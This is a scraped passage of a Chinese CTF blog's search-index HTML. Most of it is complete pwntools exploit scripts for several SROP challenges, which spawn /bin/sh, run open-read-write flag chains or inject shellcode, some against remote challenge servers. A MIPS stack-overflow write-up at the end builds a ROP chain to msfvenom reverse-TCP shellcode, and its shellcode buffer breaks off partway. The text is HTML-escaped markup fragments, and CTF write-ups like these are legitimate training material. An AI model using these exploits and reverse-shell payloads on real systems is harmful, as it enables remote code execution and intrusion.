# io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28623)

vuln=0x4004ed
syscall=0x400517
mov_rax_0xf=0x4004da

# gdb.attach(io)
# pause()

payload=p64(vuln)*3
io.send(payload)

stack_addr=u64(io.recv()[0x20:0x28])
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

str_bin_sh=stack_addr-0x118

sigframe=SigreturnFrame()
sigframe.rax=59
sigframe.rdi=str_bin_sh
sigframe.rsi=0
sigframe.rsp=stack_addr
sigframe.rdx=0
sigframe.rip=syscall

payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;360chunqiu2017_smallest&#34;&gt;360chunqiu2017_smallest&lt;/h3&gt;
&lt;p&gt;只有一次read_sys,但是直接读到rsp上&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689677310959.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
需要第一次返回时修改低1字节跳过&lt;code&gt;xor rax,rax&lt;/code&gt;命令，使得rax不为0，从而执行write_sys泄露栈地址，第三次时构造read往栈上读，最后构造execve执行即可&lt;br&gt;
注意sleep，不能发太快，发太快远端会炸&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./smallest&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28027)

main=0x4000b0
syscall=0x4000be

payload=p64(main)*3
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\xb3&amp;quot;)
stack_addr=u64(io.recv()[0x8:0x10])
# stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=stack_addr
sigframe.rsp=stack_addr
sigframe.rdx=0x400
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe) #八个字节padding,出去信号机制的pop影响
io.send(payload)

sleep(1)  #远端防炸

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

#execve
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr+0x190
sigframe.rsp=stack_addr
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe)
payload=payload.ljust(0x190,b&amp;quot;\x00&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

sleep(1)

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nepctf_srop&#34;&gt;nepctf_srop&lt;/h3&gt;
&lt;p&gt;开启沙盒，orw&lt;br&gt;
此题没有&lt;code&gt;syscall;ret&lt;/code&gt;的gadget，只有&lt;code&gt;syscall()&lt;/code&gt;函数，&lt;code&gt;syscall()&lt;/code&gt;函数可以通过控制&lt;code&gt;$rdi&lt;/code&gt;来控制&lt;code&gt;$rax&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov     rax, rdi
mov     rdi, rsi
mov     rsi, rdx
mov     rdx, rcx
mov     r10, r8
mov     r8, r9
mov     r9, [rsp+arg_0]
syscall      
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只给了一次读入的机会，我们可以通过这一次读入调用&lt;code&gt;read&lt;/code&gt;读到bss段实现栈迁移上打orw&lt;br&gt;
orw的实现均由&lt;code&gt;syscall()&lt;/code&gt;函数实现&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)

buf_addr=0x601200
syscall=0x4005B0
pop_rdi=0x400813
flag=buf_addr+0x600

io.recvuntil(b&amp;quot;2023!\n&amp;quot;)

#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rdi=0 #read 系统调用号
sigframe.rsi=0 #stdin 标准输入
sigframe.rdx=buf_addr #buf
sigframe.rcx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall

payload=cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)


gdb.attach(io)
pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rdi=2 #open 系统调用号
sigframe_open.rsi=flag #filename
sigframe_open.rdx=0 
sigframe_open.rcx=0
sigframe_open.rsp=buf_addr+0x200 # top addr
sigframe_open.rip=syscall

payload=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_open)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rdi=0 #read 系统调用号
sigframe_read.rsi=3 #fd
sigframe_read.rdx=flag+0x100 #buf
sigframe_read.rcx=0x50 #size
sigframe_read.rsp=buf_addr+0x400 # top addr
sigframe_read.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_read)
payload=payload.ljust(0x400,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rdi=1 #write 系统调用号
sigframe_write.rsi=1 #stdout 标准输出
sigframe_write.rdx=flag+0x100 #buf
sigframe_write.rcx=0x50 #size
sigframe_write.rsp=buf_addr+0x600 # top addr
sigframe_write.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_write)
payload=payload.ljust(0x600,b&amp;quot;a&amp;quot;)+b&amp;quot;flag.txt\x00&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rootersctf_2019_srop&#34;&gt;rootersctf_2019_srop&lt;/h3&gt;
&lt;p&gt;给的&lt;code&gt;syscall;leave;retn&lt;/code&gt;的gadget&lt;br&gt;
不用leak出栈地址，直接在bss段上伪造栈读入就行了，注意指定&lt;code&gt;$rbp&lt;/code&gt;，不然可能卡住&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26176)
elf=ELF(&amp;quot;./pwn&amp;quot;)

pop_syscall=0x401032
syscall_leave_ret=0x401033
buf_addr=0x402200
sh_addr=buf_addr+0x200

io.recvuntil(b&amp;quot;CTF?\n&amp;quot;)

sigframe=SigreturnFrame()
sigframe.rax=0
sigframe.rdi=0
sigframe.rsi=buf_addr
sigframe.rdx=0x800
sigframe.rsp=buf_addr
sigframe.rbp=buf_addr
sigframe.rip=syscall_leave_ret

payload=cyclic(0x88)+p64(pop_syscall)+p64(0xf)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


sigframe_exec=SigreturnFrame()
sigframe_exec.rax=59
sigframe_exec.rdi=sh_addr
sigframe_exec.rsi=0
sigframe_exec.rdx=0
sigframe_exec.rsp=buf_addr+0x200
sigframe_exec.rip=syscall_leave_ret

payload=p64(0)+p64(pop_syscall)+p64(0xf)+bytes(sigframe_exec)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;aout&#34;&gt;a.out&lt;/h3&gt;
&lt;p&gt;整个程序如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0000000000401000                               ; =============== S U B R O U T I N E =======================================
.text:0000000000401000
.text:0000000000401000
.text:0000000000401000                               ; signed __int64 start()
.text:0000000000401000                               public _start
.text:0000000000401000                               _start proc near                        ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000401000                                                                       ; LOAD:0000000000400088↑o
.text:0000000000401000 B8 01 00 00 00                mov     eax, 1
.text:0000000000401005 BF 01 00 00 00                mov     edi, 1                          ; fd
.text:000000000040100A 48 BE 00 20 40 00 00 00 00 00 mov     rsi, offset msg                 ; &amp;quot;Hello Pwn&amp;quot;
.text:0000000000401014 BA 09 00 00 00                mov     edx, 9                          ; count
.text:0000000000401019 0F 05                         syscall                                 ; LINUX - sys_write
.text:000000000040101B B8 00 00 00 00                mov     eax, 0
.text:0000000000401020 48 89 E6                      mov     rsi, rsp                        ; buf
.text:0000000000401023 BF 00 00 00 00                mov     edi, 0                          ; fd
.text:0000000000401028 BA 90 01 00 00                mov     edx, 190h                       ; count
.text:000000000040102D 0F 05                         syscall                                 ; LINUX - sys_read
.text:000000000040102F C3                            retn
.text:000000000040102F
.text:000000000040102F                               _start endp
.text:000000000040102F
.text:0000000000401030                               ; ---------------------------------------------------------------------------
.text:0000000000401030 48 D1 E0                      shl     rax, 1
.text:0000000000401033 C3                            retn
.text:0000000000401033
.text:0000000000401034                               ; ---------------------------------------------------------------------------
.text:0000000000401034 B9 01 00 00 00                mov     ecx, 1
.text:0000000000401039 48 31 C8                      xor     rax, rcx
.text:000000000040103C C3                            retn
.text:000000000040103C
.text:000000000040103D                               ; ---------------------------------------------------------------------------
.text:000000000040103D 48 31 C0                      xor     rax, rax
.text:0000000000401040 C3                            retn
.text:0000000000401040
.text:0000000000401040                               _text ends
.text:0000000000401040
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;srop，需要手动构造rax的值为0xf触发sigframe&lt;br&gt;
还是老样子伪造栈在bss上打，题目已经给出&lt;code&gt;/bin/sh&lt;/code&gt;的地址&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./a&amp;quot;)

syscall_ret=0x40102d
str_sh=0x40200A
ret_wt=0x401014
bss_addr=0x402200
shl_rax=0x401030
xor_1=0x401034 
xor_rax=0x40103D 

gdb.attach(io)
pause()

#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=bss_addr
sigframe.rdx=0x800
sigframe.rsp=bss_addr
sigframe.rbp=bss_addr
sigframe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe)
io.sendafter(b&amp;quot;Pwn&amp;quot;,payload)

sleep(3)


sigframe_exe=SigreturnFrame()
sigframe_exe.rax=constants.SYS_execve
sigframe_exe.rdi=str_sh
sigframe_exe.rsp=bss_addr
sigframe_exe.rbp=bss_addr
sigframe_exe.rsi=0
sigframe_exe.rdx=0
sigframe_exe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe_exe)
# payload=b&amp;quot;aaaaaqaaaaaaa&amp;quot;
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame2023_srop&#34;&gt;0xGame2023_srop:&lt;/h3&gt;
&lt;p&gt;0x两道题都能用这个打&lt;br&gt;
fake stack打orw&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./srop-revenge&amp;quot;)
io=remote(&amp;quot;8.130.35.16&amp;quot;,55003)
elf=ELF(&amp;quot;./srop-revenge&amp;quot;)

buf_addr=0x404800
syscall_ret=0x40138b
pop_rax=0x401390
flag=buf_addr+0x450


#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rax=0 #read 系统调用号
sigframe.rdi=0 #stdin 标准输入
sigframe.rsi=buf_addr #buf
sigframe.rdx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall_ret

payload=cyclic(0x10)+p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rax=2 #open 系统调用号
sigframe_open.rdi=flag #filename
sigframe_open.rsi=0 
sigframe_open.rdx=0
sigframe_open.rsp=buf_addr+0x150 # top addr
sigframe_open.rip=syscall_ret

payload=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_open)
payload=payload.ljust(0x150,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rax=0 #read 系统调用号
sigframe_read.rdi=3 #fd
sigframe_read.rsi=flag+0x100 #buf
sigframe_read.rdx=0x50 #size
sigframe_read.rsp=buf_addr+0x300 # top addr
sigframe_read.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_read)
payload=payload.ljust(0x300,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rax=1 #write 系统调用号
sigframe_write.rdi=1 #stdout 标准输出
sigframe_write.rsi=flag+0x100 #buf
sigframe_write.rdx=0x50 #size
sigframe_write.rsp=buf_addr+0x450 # top addr
sigframe_write.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_write)
payload=payload.ljust(0x450,b&amp;quot;a&amp;quot;)+b&amp;quot;flag&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;htb_sick_rop&#34;&gt;htb_sick_rop:&lt;/h3&gt;
&lt;p&gt;利用read读0xf构造sigreturn，然后mprotect开写权限&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sick_rop&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,30061)
elf=ELF(&amp;quot;./sick_rop&amp;quot;)
libc=elf.libc

read_text=0x401040
write_fuc=0x401017
write_text=0x401048
vuln=0x40102e
leave_ret=0x40104d
syscall_ret=0x401014
sc_addr=0x4010f8

# mprotect
sigframe=SigreturnFrame()
sigframe.rax=10  # mprotect
sigframe.rdi=0x401000  # addr
sigframe.rsi=0x1000 # len
sigframe.rdx=0x7 # flag
sigframe.rsp=0x4010f0 # ret to _start
sigframe.rip=syscall_ret

payload=cyclic(0x28)+p64(vuln)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)

# gdb.attach(io)
# pause()

payload=b&amp;quot;a&amp;quot;*0xf
io.send(payload)

shellcode=asm(shellcraft.sh())
payload=cyclic(0x28)+p64(sc_addr)+shellcode
io.send(payload)


io.interactive()

# 0x000000000040104d : leave ; ret
# 0x0000000000401016 : ret
# 0x0000000000401014 : syscall ; ret
&lt;/code&gt;&lt;/pre&gt;
">SROP</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/KBygv4GCN/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;摸了2天🐟把这个看了一下，第一天本来能够出的，结果找的gadget卡在sw语句不执行了，gdb爆warning &lt;code&gt;can&#39;t find the start of the function at xxx&lt;/code&gt;，网络上说是无法访问共享库的问题😓；&lt;br&gt;
第二天重新找了几个gadget结果最后又出现同样的问题，最后又重新找了几个gadget尽可能简化了操作数才打通&lt;/p&gt;
&lt;h3 id=&#34;概述&#34;&gt;概述：&lt;/h3&gt;
&lt;p&gt;本题溢出点存在于&lt;code&gt;sprintf&lt;/code&gt;函数拼接变量&lt;code&gt;v10&lt;/code&gt;长度超过&lt;code&gt;v11&lt;/code&gt;缓冲区大小，可以导致&lt;code&gt;v11&lt;/code&gt;栈溢出&lt;br&gt;
本题数据传输通过socket，bash脚本指定端口初始化如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./socket_bof &amp;quot;9999&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最开始我们gdb-multiarch remote到1234端口后在程序建立监听的函数后下断点c过去，然后使用cyclic脚本测算偏移，脚本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

payload=cyclic(0x300)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以测出偏移为51&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1692793724271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后我们就可以着手exp的编写&lt;br&gt;
为了绕过MIPS架构的缓存不一致性，我们需要主动调用&lt;code&gt;sleep()&lt;/code&gt;来使写入的shellcode从&lt;code&gt;D-Cache&lt;/code&gt;刷新到&lt;code&gt;I-Cache&lt;/code&gt;，所以exp编写流程与前文不同&lt;br&gt;
大致流程：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.确保能溢出到$ra
2.寻找gadget将$a0值设为1，即sleep的参数
3.寻找gadget执行libc中的sleep并能够返回到下一个gadget
4.寻找gadget将包含shellcode的栈地址储存到寄存器中
5.寻找gadget将寄存器值赋值到跳转语句寄存器上跳转到栈上的正确位置执行shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gadgets查找&#34;&gt;gadgets查找：&lt;/h4&gt;
&lt;p&gt;首先是找给&lt;code&gt;$a0&lt;/code&gt;寄存器赋值为1的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Found 45 matching gadgets
Python&amp;gt;mipsrop.find(&amp;quot;li $a0,1&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x00018AA8  |  li $a0,1                                            |  jalr  $s3                             |
|  0x0002FB10  |  li $a0,1                                            |  jalr  $s1                             |
|  0x00012D3C  |  li $a0,1                                            |  jr    0x20+var_s0($sp)                |
|  0x00022420  |  li $a0,1                                            |  jr    0x18+var_s8($sp)                |
|  0x0002A9C8  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
----------------------------------------------------------------------------------------------------------------
Found 5 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们采用偏移为0x2FB10的gadget0&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0002FB10 01 00 04 24                   li      $a0, 1
.text:0002FB14 21 C8 20 02                   move    $t9, $s1
.text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们需要找到一个能够对&lt;code&gt;$s1&lt;/code&gt;赋值的gadget1，查找&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;lw $s1&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以找到0x7730处的gadget1，并且这里还可以控制一些其它寄存器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
.text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
.text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00007744 08 00 E0 03                   jr      $ra
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到此处位置，我们需要在执行完&lt;code&gt;sleep&lt;/code&gt;后继续执行shellcode的话，需要一个利用&lt;code&gt;$ra&lt;/code&gt;除外寄存器跳转的并且可以写&lt;code&gt;$ra&lt;/code&gt;的gadget2，继续查找&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E03C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0001F07C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0001F2C0  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0001FBCC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x000201F4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00020F1C  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00020FE4  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021200  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021C34  |  move $t9,$s3                                        |  jr    $s3                             |
|  0x00022E94  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0002313C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x000267B4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00033AF4  |  move $t9,$s0                                        |  jr    $s0                             |
----------------------------------------------------------------------------------------------------------------
Found 13 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们使用偏移0x20F1C处的gadget2，不仅能够给&lt;code&gt;$ra&lt;/code&gt;寄存器赋值，也能用gadget1控制&lt;code&gt;$s2&lt;/code&gt;值进行跳转&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00020F1C 21 C8 40 02                   move    $t9, $s2
.text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
.text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00020F30 08 00 20 03                   jr      $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以通过&lt;code&gt;jr $t9&lt;/code&gt;跳转到&lt;code&gt;sleep&lt;/code&gt;函数中，我们只需要通过gadget2控制&lt;code&gt;$ra&lt;/code&gt;为shellcode的栈地址即可，我们可以通过&lt;code&gt;mipsrop.stackfinder()&lt;/code&gt;查找，这个指令是查找将栈地址存入寄存器的gadget，找到偏移0x16DD0处的gadget3&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
.text:00016DD4 21 C8 00 02                   move    $t9, $s0
.text:00016DD8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处通过控制&lt;code&gt;$s0&lt;/code&gt;进一步控制&lt;code&gt;$t9&lt;/code&gt;，而&lt;code&gt;$s0&lt;/code&gt;我们在gadget2中即可控制，那么我们要跳转到shellcode所在栈地址上，则需要将&lt;code&gt;$a0&lt;/code&gt;值存入&lt;code&gt;$t9&lt;/code&gt;，所以我们这里控制&lt;code&gt;$s0&lt;/code&gt;的值为下一个gadget4，查找&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;move $t9,$a0&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000214A0  |  move $t9,$a0                                        |  jalr  $a0                             |
----------------------------------------------------------------------------------------------------------------
Found 1 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;偏移0x214A0处的gadget4满足我们的需求&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:000214A0 21 C8 80 00                   move    $t9, $a0
.text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
.text:000214A8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以到目前为止我们梳理一遍思路，可以得出下面的大致流程：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget1-&amp;gt;gadget0-gadget2-&amp;gt;sleep()-&amp;gt;gadget3-&amp;gt;gadget4-&amp;gt;shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以根据这个流程大致写出payload然后gdb调试&lt;br&gt;
在本机上运行的时候，发现在gadget2上填充padding的时候，需要额外填充0x4字节的数据才能正常给对应寄存器赋值&lt;br&gt;
msfvenom生成shellcode的时候注意指定&lt;code&gt;LHOST&lt;/code&gt;和&lt;code&gt;LPORT&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;exp:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

libc_base=0x3fecd000
sleep_func=0x2f2b0+libc_base


# msfvenom -p linux/mipsle/shell_reverse_tcp --arch mipsle --platform linux -f py --bad-chars &#39;\x00&#39;
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&amp;quot;
buf += b&amp;quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&amp;quot;
buf += b&amp;quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&amp;quot;
buf += b&amp;quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&amp;quot;
buf += b&amp;quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&amp;quot;
buf += b&amp;quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&amp;quot;
buf += b&amp;quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&amp;quot;
buf += b&amp;quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&amp;quot;
